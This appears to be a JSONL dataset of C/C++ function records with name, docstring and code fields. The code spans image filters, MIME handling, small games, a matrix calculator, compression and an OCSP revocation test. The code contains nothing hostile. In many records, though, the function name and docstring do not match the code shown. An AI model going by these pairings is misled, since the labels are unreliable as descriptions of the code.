{"content":"{'function_name': 'filter', 'docstring': '\/\/filtering is skipped if s==0.0', 'code': 'void filter(int w,int h,T* src,T* dst)\\n\\t{\\n\\t\\tif(w<=4.0*sx || h<=4.0*sy)\\n\\t\\t\\tthrow std::invalid_argument(\"\\\\\\'sx\\\\\\' and \\\\\\'sy\\\\\\' should be less than about w\/4 or h\/4!\");\\n\\t\\t\\n\\t\\t\/\/filtering is skipped if s==0.0\\n\\t\\tif(sx==0.0 && sy==0.0)\\n\\t\\t\\treturn;\\n\\t\\telse if(sx==0.0)\\n\\t\\t\\tfilter_v<T>(w,h,src,dst);\\n\\t\\telse if(sy==0.0)\\n\\t\\t\\tfilter_h<T>(w,h,src,dst);\\n\\t\\telse\\n\\t\\t{\\n\\t\\t\\tfilter_v<T>(w,h,src,dst);\\n\\t\\t\\tfilter_h<T>(w,h,dst,dst); \/\/only filter_h() allows src==dst.\\n\\t\\t}\\n\\t}'}","id":167}
{"content":"{'function_name': 'demosaicb_rd1_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd10_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd10 read pattern: { demosaicb_update_0[d0, d1] -> denoise[2d0, d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 964 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write0 = denoise.denoise_denoise_update_0_write0_merged_banks_9.peek_964();\\n  return value_denoise_denoise_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":169}
{"content":"{'function_name': 'readAttributeHeader', 'docstring': '\/\/size of header attribute = 22', 'code': 'int checkCondition(int flags,  int value_of_flags){ \/\/ Ham kiem tra dieu kien: Chi xuat neu la tap tin archieve hoac thu muc + tap tin chua bi xoa\\n    if (flags != 0 && flags != 2  && (value_of_flags == 32 || value_of_flags == 268435456)) {\\n        return 1;\\n     }\\n    return 0;\\n}'}","id":170}
{"content":"{'function_name': 'InitialChessType', 'docstring': '\/\/\u8bbe\u7f6e\u68cb\u8c31\u4fdd\u5b58\u76ee\u5f55', 'code': 'VOID SetChessType(int i,HMENU hMenu)\\n{\\t\\n\\tif(i==chesstype||i>=chessNum)\/\/\u6240\u9009\u68cb\u79cd\u975e\u5f53\u524d\u68cb\u79cd\\n\\t\\treturn;\\n\\tif (game.GameMode != -1)\\n\\t{\\n\\t\\tMsgBox(\"\u5bf9\u5f08\u6b63\u5728\u8fdb\u884c\uff0c\u4e0d\u80fd\u8fdb\u884c\u68cb\u79cd\u5207\u6362\uff01\", \"error\", 0);\\n\\t\\treturn;\\n\\t}\\n\\n\\tdelete GameType;\\n\\n\\tchesstype=i;\/\/\u7f6e\u65b0\u8bed\u8a00\u6807\u5fd7\\n\\tstrcpy(gameSet.DefualtChess, chessType[chesstype].chessStr);\\n\\tfor(int i=0;i<chessNum;i++)\\n\\t{\\n\\t\\tif(i==chesstype)\\n\\t\\t\\tCheckMenuItem(hMenu,CHESSTYPE+i,MF_CHECKED);\\n\\t\\telse\\n\\t\\t\\tCheckMenuItem(hMenu,CHESSTYPE+i,MF_UNCHECKED);\\t\\t\\t\\n\\t}\\n\\t\/\/\u52a8\u6001\u83b7\u53d6DLL\u5e93\u4e2d\u51fd\u6570\u5730\u5740\\n\\tCT_InitModule = (_InitModule)GetProcAddress(chessType[chesstype].chessTP, \"InitModule\");\\n\\n\\tGameType = (CChess*)CT_InitModule(MainWnd->hWnd, chessType[chesstype].LibPath);\\n\\tGameType->SetBoard(MainWnd->GetBoardPos());\\n\\tInvalidateRect(MainWnd->hWnd,NULL,false);\\n\\n\\t\/\/\u8bbe\u7f6e\u81ea\u52a8\u622a\u56fe\u76ee\u5f55\\n\\tstrcpy(gameSet.PrintScrDir,\".\\\\\\\\chess manual\\\\\\\\\");\\n\\tstrcat(gameSet.PrintScrDir,chessType[chesstype].chessStr);\\n\\tstrcat(gameSet.PrintScrDir,\"\\\\\\\\bmp\");\\n\\tCreateFolder(gameSet.PrintScrDir);\\n\\t\/\/\u8bbe\u7f6e\u68cb\u8c31\u4fdd\u5b58\u76ee\u5f55\\n\\tstrcpy(gameSet.cmDir, \".\\\\\\\\chess manual\\\\\\\\\");\\n\\tstrcat(gameSet.cmDir,chessType[chesstype].chessStr);\\n\\tstrcat(gameSet.cmDir,\"\\\\\\\\sgf\");\\n\\tCreateFolder(gameSet.cmDir);\\n\\n\\treturn;\\n}'}","id":172}
{"content":"{'function_name': 'testing_level_set_max_min', 'docstring': '\/\/std::cout<<\"At time t = \"<<time<<\": MIN(phi) = \"<<ret1<<\" , MAX(phi) = \"<<ret0<< std::endl;', 'code': 'bool\\npt_in_cell(const Mesh& msh, const point<T,2>& point_to_find, const typename Mesh::cell_type& cl)\\n{\\n    auto pts =points(msh,cl);\\n \\n    \/\/std::cout<<\"Point to find \"<<std::setprecision(15)<<point_to_find.x()<<\", \"<<point_to_find.y()<<std::endl;\\n\\n   \/\/ std::cout<<\"Min x \"<<std::setprecision(15)<<pts[0].x()<<\", max x \"<<pts[1].x()<<std::endl;\\n\\n    \/\/std::cout<<\"Min y \"<<std::setprecision(15)<<pts[1].y()<<\", max y \"<<pts[2].y()<<std::endl;\\n\\n    T epsilon = 1e-10;\\n     if( (pts[0].x()-epsilon)<=point_to_find.x() && (pts[1].x()+epsilon)>=point_to_find.x() && (pts[1].y()-epsilon)<=point_to_find.y() && (pts[2].y()+epsilon)>=point_to_find.y() )\\n         return TRUE;\\n    else\\n        return FALSE;\\n  \\n}'}","id":173}
{"content":"{'function_name': 'MimeOleCreateHeaderTable', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleCreateVirtualStream(IStream **ppStream)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT hr=S_OK;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == ppStream)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Allocate Virtual Stream\\r\\n    *ppStream = new CVirtualStream;\\r\\n    if (NULL == *ppStream)\\r\\n    {\\r\\n        hr = TrapError(E_OUTOFMEMORY);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":174}
{"content":"{'function_name': 'fireMenu', 'docstring': '\/\/Captures the number from the user of what ship to fire from', 'code': 'int moveMenu(void){\\t\\t\\t\/\/Creates the move menu, which asks the user which ship he wished to move.\\n\\t\\tcout << \" Battleship    \" << endl << endl;\\n\\t\\tcout << \" Please select the ship you would like to move.\" << endl<< endl;\\n\\t\\tcout << \" 1. Carrier\" <<endl; \\n\\t\\tcout << \" 2. Cruiser\" <<endl;\\n\\t\\tcout << \" 3. Submarine\" << endl; \\n\\t\\tcout << \" 4. Battleship\" << endl; \\n\\t\\tcout << \" 5. Destroyer\" << endl;\\n\\n\\t\\tcin >> moveS;\\t\/\/Captures the number from the user of which ship to move\\n\\t\\treturn moveS;\\n}'}","id":176}
{"content":"{'function_name': 'leaf_nodes', 'docstring': '\/\/If tree is not empty', 'code': 'int main()\\n{\\n    \/\/Initialize tree as empty\\n    treeNode *root;\\n    root = NULL;\\n    int n, data;\\n    \/\/Accept the no. of elements and elements as user input\\n    scanf(\"%d\", &n);\\n\\n    for (int i = 0; i < n; i++)\\n    {\\n        scanf(\"%d\", &data);\\n        root = insertIntoTree(root, data);\\n    }\\n\\n    printf(\"\\\\nNo. of leaf nodes in the binary search tree = %d\", leaf_nodes(root));\\n    printf(\"\\\\n\");\\n    return 0;\\n}'}","id":179}
{"content":"{'function_name': 'MimeOleContentBaseFromBody', 'docstring': '\/\/ Return\\r', 'code': 'MIMEOLEAPI MimeOleGetRelatedSection(\\r\\n                                    IMimeMessageTree   *pTree,\\r\\n                                    boolean             fCreate,\\r\\n                                    LPHBODY             phRelated,\\r\\n                                    boolean            *pfMultiple)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    HBODY       hRoot;\\r\\n    FINDBODY    rFind;\\r\\n    PROPVARIANT rVariant;\\r\\n\\r\\n    \/\/ Invalid Args\\r\\n    if (NULL == pTree || NULL == phRelated)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Init\\r\\n    ZeroMemory(&rFind, sizeof(FINDBODY));\\r\\n\\r\\n    \/\/ Find first multipart\/related section\\r\\n    rFind.pszPriType = (LPSTR)STR_CNT_MULTIPART;\\r\\n    rFind.pszSubType = (LPSTR)STR_SUB_RELATED;\\r\\n\\r\\n    \/\/ Init\\r\\n    if (pfMultiple)\\r\\n        *pfMultiple = FALSE;\\r\\n\\r\\n    \/\/ Find First\\r\\n    if (SUCCEEDED(pTree->FindFirst(&rFind, phRelated)))\\r\\n    {\\r\\n        \/\/ Is there another multipart\/related section\\r\\n        if (pfMultiple && SUCCEEDED(pTree->FindNext(&rFind, &hRoot)))\\r\\n            *pfMultiple = TRUE;\\r\\n\\r\\n        \/\/ Done\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ If no Create, fail\\r\\n    if (FALSE == fCreate)\\r\\n    {\\r\\n        hr = TrapError(MIME_E_NOT_FOUND);\\r\\n        goto exit;\\r\\n    }\\r\\n\\r\\n    \/\/ Get the Root Body\\r\\n    CHECKHR(hr = pTree->GetBody(IBL_ROOT, NULL, &hRoot));\\r\\n\\r\\n    \/\/ Setup Variant\\r\\n    rVariant.vt = VT_LPSTR;\\r\\n    rVariant.pszVal = (LPSTR)STR_MIME_MPART_RELATED;\\r\\n\\r\\n    \/\/ If Root is empty\\r\\n    if (pTree->IsBodyType(hRoot, IBT_EMPTY) == S_OK)\\r\\n    {\\r\\n        \/\/ Set the Content Type\\r\\n        CHECKHR(hr = pTree->SetBodyProp(hRoot, PIDTOSTR(PID_HDR_CNTTYPE), 0, &rVariant));\\r\\n\\r\\n        \/\/ Set phRelated\\r\\n        *phRelated = hRoot;\\r\\n    }\\r\\n\\r\\n    \/\/ If root is non-multipart, convert it to multipart\/related\\r\\n    else if (pTree->IsContentType(hRoot, STR_CNT_MULTIPART, NULL) == S_FALSE)\\r\\n    {\\r\\n        \/\/ Conver this body to a multipart\/related\\r\\n        CHECKHR(hr = pTree->ToMultipart(hRoot, STR_SUB_RELATED, phRelated));\\r\\n    }\\r\\n\\r\\n    \/\/ Otherwise, if root is multipart\/mixed\\r\\n    else if (pTree->IsContentType(hRoot, NULL, STR_SUB_MIXED) == S_OK)\\r\\n    {\\r\\n        \/\/ Insert First Child of multipart\/mixed as multipart\/related\\r\\n        CHECKHR(hr = pTree->InsertBody(IBL_FIRST, hRoot, phRelated));\\r\\n\\r\\n        \/\/ Set the Content Type\\r\\n        CHECKHR(hr = pTree->SetBodyProp(*phRelated, PIDTOSTR(PID_HDR_CNTTYPE), 0, &rVariant));\\r\\n    }\\r\\n\\r\\n    \/\/ Otherwise, if root is multipart\/alternative\\r\\n    else if (pTree->IsContentType(HBODY_ROOT, NULL, STR_SUB_ALTERNATIVE) == S_OK)\\r\\n    {\\r\\n        \/\/ Convert this body to a multipart\/related (alternative becomes first child)\\r\\n        CHECKHR(hr = pTree->ToMultipart(HBODY_ROOT, STR_SUB_RELATED, phRelated));\\r\\n\\r\\n        \/\/ Should I set multipart\/related; start=multipart\/alternative at this point ?\\r\\n    }\\r\\n\\r\\n    \/\/ Otherwise, for unknown multipart content types\\r\\n    else\\r\\n    {\\r\\n        \/\/ Convert this body to a multipart\/related\\r\\n        CHECKHR(hr = pTree->ToMultipart(HBODY_ROOT, STR_SUB_RELATED, phRelated));\\r\\n    }\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":181}
{"content":"{'function_name': 'CLOCK_InitUsb1Pfd', 'docstring': '\/* Set the new value and enable output. *\/', 'code': 'bool CLOCK_EnableUsbhs1PhyPllClock(clock_usb_phy_src_t src, uint32_t freq)\\n{\\n    const clock_usb_pll_config_t g_ccmConfigUsbPll = {.loopDivider = 0U, .src = 0};\\n    CLOCK_InitUsb2Pll(&g_ccmConfigUsbPll);\\n    USBPHY2->CTRL &= ~USBPHY_CTRL_SFTRST_MASK; \/* release PHY from reset *\/\\n    USBPHY2->CTRL &= ~USBPHY_CTRL_CLKGATE_MASK;\\n\\n    USBPHY2->PWD = 0;\\n    USBPHY2->CTRL |= USBPHY_CTRL_ENAUTOCLR_PHY_PWD_MASK | USBPHY_CTRL_ENAUTOCLR_CLKGATE_MASK |\\n                     USBPHY_CTRL_ENUTMILEVEL2_MASK | USBPHY_CTRL_ENUTMILEVEL3_MASK;\\n\\n    freq = (uint32_t)src;\\n    freq++;\\n    return true;\\n}'}","id":187}
{"content":"{'function_name': 'ColumnsNO', 'docstring': '\/\/This part checks if all rows have equal number of elements', 'code': \"int main()\\n{\\n\\tfloat MAT1[100][100], MAT2[100][100], MATRES[100][100], MAT1I[100][100], MAT2I[100][100], MATRESI[100][100]; \/\/MAT1 is a matrix with m rows & n columns, MAT2 is a matrix with p rows and q columns\\n\\tstring strMAT1, strMAT2, strMATRES, operation;\\n\\tint m, n, p, q, checkinp, checkoperation, isComplex;\\n\\tfloat determinant;\\n\\tgetline(cin, strMAT1);\\n\\tm = RowsNO(strMAT1);\\n\\tn = ColumnsNO(strMAT1);\\n\\tcheckinp = CheckInput(strMAT1, m, n);\\n\\tif (checkinp == 0)\\n\\t{\\n\\t\\tERROR\\n\\t}\\n\\tif (checkinp == 2)\\n\\t{\\n\\t\\tisComplex = 1;\\n\\t}\\n\\tStringToArray(strMAT1, MAT1, MAT1I, m, n);\\n\\tgetline(cin, operation);\\n\\tif (operation.length() != 1)\\n\\t{\\n\\t\\tERROR\\n\\t}\\n\\tswitch (operation[0])\\n\\t{\\n\\tcase '+':\\n\\t\\tgetline(cin, strMAT2);\\n\\t\\tp = RowsNO(strMAT2);\\n\\t\\tq = ColumnsNO(strMAT2);\\n\\t\\tcheckinp = CheckInput(strMAT2, p, q);\\n\\t\\tStringToArray(strMAT2, MAT2, MAT2I, p, q);\\n\\t\\tcheckoperation = AddorSubtract(MAT1, MAT1I, MAT2, MAT2I, MATRES, MATRESI, m, n, p, q, operation[0]);\\n\\t\\tif (checkinp == 0 || checkoperation == 0)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tstrMATRES = ArrayToString(MATRES, MATRESI, m, n);\\n\\t\\tcout << strMATRES;\\n\\t\\tbreak;\\n\\tcase '-':\\n\\t\\tgetline(cin, strMAT2);\\n\\t\\tp = RowsNO(strMAT2);\\n\\t\\tq = ColumnsNO(strMAT2);\\n\\t\\tcheckinp = CheckInput(strMAT2, p, q);\\n\\t\\tStringToArray(strMAT2, MAT2, MAT2I, p, q);\\n\\t\\tcheckoperation = AddorSubtract(MAT1, MAT1I, MAT2, MAT2I, MATRES, MATRESI, m, n, p, q, operation[0]);\\n\\t\\tif (checkinp == 0 || checkoperation == 0)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tstrMATRES = ArrayToString(MATRES, MATRESI, m, n);\\n\\t\\tcout << strMATRES;\\n\\t\\tbreak;\\n\\tcase '*':\\n\\t\\tgetline(cin, strMAT2);\\n\\t\\tp = RowsNO(strMAT2);\\n\\t\\tq = ColumnsNO(strMAT2);\\n\\t\\tcheckinp = CheckInput(strMAT2, m, n);\\n\\t\\tStringToArray(strMAT2, MAT2, MAT2I, p, q);\\n\\t\\tcheckoperation = Multiply(MAT1, MAT1I, MAT2, MAT2I, MATRES, MATRESI, m, n, p, q);\\n\\t\\tif (checkinp == 0 || checkoperation == 0)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tstrMATRES = ArrayToString(MATRES, MATRESI, m, q);\\n\\t\\tcout << strMATRES;\\n\\t\\tbreak;\\n\\tcase '^':\\n\\t\\tif (m != n)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tfloat power;\\n\\t\\tcin >> power;\\n\\t\\tif (power < 0 || power - (int)power != 0 || isComplex == 1)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tfor (int i = 0; i < m; i++)\\n\\t\\t{\\n\\t\\t\\tfor (int j = 0; j < n; j++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tMAT2[i][j] = MAT1[i][j];\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tfor (int i = 2; i <= power; i++)\\n\\t\\t{\\n\\t\\t\\tMultiply(MAT2, MAT2I, MAT1, MAT1I, MATRES, MATRESI, m, m, m, m);\\n\\t\\t\\tfor (int i = 0; i < m; i++)\\n\\t\\t\\t{\\n\\t\\t\\t\\tfor (int j = 0; j < m; j++)\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tMAT2[i][j] = MATRES[i][j];\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\t\\tstrMATRES = ArrayToString(MATRES, MAT1I, m, m);\\n\\t\\tcout << strMATRES;\\n\\t\\tbreak;\\n\\tcase 'T':\\n\\t\\tif (isComplex == 1)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tTranspose(MAT1, MATRES, m, n);\\n\\t\\tstrMATRES = ArrayToString(MATRES, MAT1I, n, m);\\n\\t\\tcout << strMATRES;\\n\\t\\tbreak;\\n\\tcase 'D':\\n\\t\\tcheckoperation = Determinant(MAT1, m, n, determinant);\\n\\t\\tif (checkoperation == 0 || isComplex == 1)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tcout << determinant;\\n\\t\\tbreak;\\n\\tcase 'I':\\n\\t\\tcheckoperation = Inverse(MAT1, MATRES, m, n);\\n\\t\\tif (checkoperation == 0 || isComplex == 1)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tstrMATRES = ArrayToString(MATRES, MAT1I, m, n);\\n\\t\\tcout << strMATRES;\\n\\t\\tbreak;\\n\\tcase '\/':\\n\\t\\tgetline(cin, strMAT2);\\n\\t\\tp = RowsNO(strMAT2);\\n\\t\\tq = ColumnsNO(strMAT2);\\n\\t\\tcheckinp = CheckInput(strMAT2, p, q);\\n\\t\\tStringToArray(strMAT2, MAT2, MAT2I, p, q);\\n\\t\\tcheckoperation = Divide(MAT1, MAT2, MATRES, m, n, p, q);\\n\\t\\tif (checkinp == 0 || checkoperation == 0 || isComplex == 1)\\n\\t\\t{\\n\\t\\t\\tERROR\\n\\t\\t}\\n\\t\\tstrMATRES = ArrayToString(MATRES, MAT1I, m, q);\\n\\t\\tcout << strMATRES;\\n\\t\\tbreak;\\n\\tdefault: ERROR\\n\\t}\\n\\treturn 0;\\n}\"}","id":188}
{"content":"{'function_name': 'CompressLz77', 'docstring': '\/\/ |A| = 2', 'code': 'int main(int argv, char **args){\\n\\t\/\/CompressDIR(\".\/doc\", \"bb\");\\n\\t\/\/DecompressDIR(\"bb\", \".\/doc1\");\\n\\tif(argv == 4){\\n\\t\\tif(strcmp(args[1], \"-c\") == 0) {\\n\\t\\t\\tIO::FastOutput Out(args[3], IO::_50MB_);\\n\\t\\t\\tCompress(args[2], Out);\\n\\t\\t}\\n\\t\\tif(strcmp(args[1], \"-d\") == 0) {\\n\\t\\t\\tIO::FastInput In(args[2], IO::_50MB_);\\n\\t\\t\\tDecompress(In, args[3]);\\n\\t\\t}\\n\\n\\t\\tif(strcmp(args[1], \"-rc\") == 0 || strcmp(args[1], \"-cr\") == 0)\\n\\t\\t\\tCompressDIR(args[2], args[3]);\\n\\t\\tif(strcmp(args[1], \"-rd\") == 0 || strcmp(args[1], \"-dr\") == 0)\\n\\t\\t\\tDecompressDIR(args[2], args[3]);\\n\\n\\t\\tif(strcmp(args[1], \"-fc\") == 0 || strcmp(args[1], \"-cf\") == 0)\\n\\t\\t\\tLZ77::CompressLz77(bitset<1024 * 32 * 8 + 1>(), args[2], args[3], 64, 1024 * 8);\\n\\t\\tif(strcmp(args[1], \"-fd\") == 0 || strcmp(args[1], \"-df\") == 0) \\n\\t\\t\\tLZ77::DecompressLz77(bitset<1024 * 32 * 8 + 1>(), args[2], args[3]);\\n\\t}else {\\n\\t\\tputs(\"Uesage:\");\\n\\t\\tputs(\"-c file1 file2: \u8868\u793a\u5c06\u6587\u4ef61\u538b\u7f29\u4e3a\u6587\u4ef62, \u4f7f\u7528\u54c8\u592b\u66fc\u7f16\u7801\");\\n\\t\\tputs(\"-d file1 file2: \u8868\u793a\u5c06\u6587\u4ef61\u89e3\u538b\u95ee\u6587\u4ef62, \u4f7f\u7528\u54c8\u592b\u66fc\u7f16\u7801\");\\n\\t\\tputs(\"-fc file1 file2: \u8868\u793a\u5c06\u6587\u4ef61\u538b\u7f29\u4e3a\u6587\u4ef62, \u4f7f\u7528Lz77\u7b97\u6cd5 (\u614e\u7528, \u5f88\u6162, \u538b\u7f29\u7387\u6709\u65f6\u4e0d\u7406\u60f3)\");\\n\\t\\tputs(\"-fd file1 file2: \u8868\u793a\u5c06\u6587\u4ef61\u89e3\u538b\u95ee\u6587\u4ef62, \u4f7f\u7528lz77\u7b97\u6cd5 (\u614e\u7528, \u5f88\u6162, \u538b\u7f29\u7387\u6709\u65f6\u4e0d\u7406\u60f3)\");\\n\\t}\\n\\treturn 0;\\n}'}","id":193}
{"content":"{'function_name': 'ProcessResponseLoadArmy', 'docstring': '\/\/army id = server_id * 100000 + sequece', 'code': 'int32_t ProcessResponseCreateArmy(SSMessageEntry& entry) {\\n  MessageSSResponseCreateArmy* message =\\n      static_cast<MessageSSResponseCreateArmy*>(entry.get());\\n  if (!message) return ERR_INTERNAL;\\n  int64_t player_id = message->master_id();\\n  LogicPlayer* player = server->GetPlayerByID(player_id);\\n  if (message->is_fail()) {\\n    if (!player) {\\n      ERROR_LOG(logger)(\"CreateArmy Fail, PlayerID:%ld, player not exist\", player_id);\\n      return ERR_OK;\\n    }\\n    player->SendErrorCodeToClient(ERR_ARMY_NAME, MSG_CS_REQUEST_CREATE_ARMY);\\n    return ERR_OK;\\n  }\\n  sy::ArmyInfo& info = *message->mutable_info();\\n\\n  \/\/\u5728LogicServer\u91cc\u9762\u521b\u5efa\u519b\u56e2\\n  info.set_level(1);\\n  info.set_donate_time(GetVirtualSeconds());\\n  server->AddArmy(info);\\n  Army* army_info = server->GetArmyByID(info.army_id());\\n  if (!army_info) {\\n    ERROR_LOG(logger)(\"CreateArmy, InternalError\");\\n    return ERR_INTERNAL;\\n  }\\n\\n  \/\/\u628a\u81ea\u5df1\u63d2\u5165\u5230\u519b\u56e2\u957f\u7684\u4f4d\u5b50\u4e0a\u9762\u53bb\\n  sy::ArmyMemberInfo& member = *message->mutable_master();\\n  member.set_army_id(info.army_id());\\n  member.set_position(ARMY_POSITION_MASTER);\\n  if (player) {\\n    player->MakeArmyMemberInfo(&member);\\n    player->UpdateArmyMemberInfo(member);\\n  }\\n  army_info->members().push_back(member);\\n\\n  if (player) {\\n    player->ProcessResponseCreateArmy(info);\\n  }\\n  server->OnPlayerJoinArmy(player->uid(), army_info);\\n\\n  \/\/\u66f4\u65b0\u73a9\u5bb6\u7684\u519b\u56e2\\n  MessageSSOnJoinArmy update_army;\\n  update_army.set_army_id(info.army_id());\\n  update_army.set_player_id(member.player_id());\\n  server->SendServerMessageToDB(MSG_SS_ON_JOIN_ARMY, &update_army);\\n  return ERR_OK;\\n}'}","id":194}
{"content":"{'function_name': 'getSoundBytes', 'docstring': '\/\/printf(\"getSoundBytes: \\\\n\");', 'code': 'BOOL InitMachine(void)\\n{\\n\\tsnd_bSound = 1;\\n\\tXBuf = (unsigned char*)malloc(sizeof(char) * WIDTH * HEIGHT);\\n\\tif (!XBuf) {\\n\\t\\treturn 0;\\n\\t}\\n\\t\\n#ifdef SOUND\\n\\tInitSound(snd_bSound);\\n#endif \/\/ SOUND\\n\\n#ifdef USE_JOYSTICK\\n\\tInitDInput();\\n#endif \/\/ USE_JOYSTICK\\n\\n\\t\/\/InitInfo();\\n\\n\\tbytes = (unsigned char*)malloc(WIDTH * HEIGHT * 4);\\n\\tsoundBytes = (short*)malloc(2048 * 4);\\n\\tsoundBytesWork = (short*)malloc(2048 * 4);\\n\\t\\n\\tfor (int n = 0; n < 256; n++) {\\n\\t\\tPalTable[n] = 0xFF000000;\\n\\t\\tPalTable[n] |= (((n >> 2) & 7) << 21);\\n\\t\\tPalTable[n] |= ((n >> 5) << 13);\\n\\t\\tPalTable[n] |= ((n & 3) << 6);\\n\\t}\\n\\n\\treturn 1;\\n}'}","id":195}
{"content":"{'function_name': 'CombineAllHeight', 'docstring': '\/\/ \u5bf9tmpArr\u4e2d\u7684Z,\u6309\u7167\u9ad8\u5ea6\u6392\u5e8f', 'code': 'BOOL IsBottomPlaneValid( CSmartLoop *pCutLoop, CSmartLoop *PlaneLoop, double dTol, double dRatio )\\n{\\n\\t\/\/ \u5224\u65ad\u4e24\u4e2a\u73af\u7684\u91cd\u53e0\u7387\u6709\u591a\u5927\\n\\tdouble dLength = 0., dOverLap = 0. ;\\n\\tCSmartCurve *pCurve = PlaneLoop->m_pCurve ;\\n\\tfor( ; pCurve ; pCurve = pCurve->next )\\n\\t{\\n\\t\\tdLength += pCurve->GetLength () ;\\n\\t}\\n\\t\\n\\tdouble dDist[2] = { 0., 0. } ;\\n\\tCSmartSect *pSect = PlaneLoop->GetSectHead () ;\\n\\tPNT2D start, end ;\\n\\tfor( ; pSect ; pSect = pSect->next )\\n\\t{\\n\\t\\tpSect->GetEnd ( end ) ;\\n\\t\\tpSect->GetStart ( start ) ;\\n\\n\\t\\tdDist[0] = MinDistPntAndContour( pCutLoop, start ) ;\\n\\t\\tdDist[1] = MinDistPntAndContour( pCutLoop, end ) ;\\n\\t\\tif( dDist[0] < dTol && dDist[1] < dTol )\\n\\t\\t{\\n\\t\\t\\tdOverLap += pSect->GetLength () ;\\n\\t\\t}\\n\\t}\\n\\tif( dOverLap \/ dLength > dRatio )\\n\\t\\treturn FALSE ;\\n\\treturn TRUE ;\\n}'}","id":198}
{"content":"{'function_name': 'demosaicb_rd12_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd13_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd13 read pattern: { demosaicb_update_0[d0, d1] -> denoise[1 + 2d0, d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 964 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write1 = denoise.denoise_denoise_update_0_write1_merged_banks_9.peek_964();\\n  return value_denoise_denoise_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":200}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ AIA OCSP url is included, but does not return a successful ocsp response.', 'code': 'TEST_F(HTTPSHardFailTest, RevokedStapled) {\\n  if (!SystemSupportsOCSPStapling()) {\\n    LOG(WARNING)\\n        << \"Skipping test because system doesn\\'t support OCSP stapling\";\\n    return;\\n  }\\n\\n  if (!SystemSupportsHardFailRevocationChecking()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support hard fail \"\\n                 << \"revocation checking\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n\\n  \/\/ AIA OCSP url is included, but does not return a successful ocsp response.\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      EmbeddedTestServer::OCSPConfig::ResponseType::kTryLater);\\n\\n  cert_config.stapled_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::REVOKED,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  EXPECT_EQ(CERT_STATUS_REVOKED, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":203}
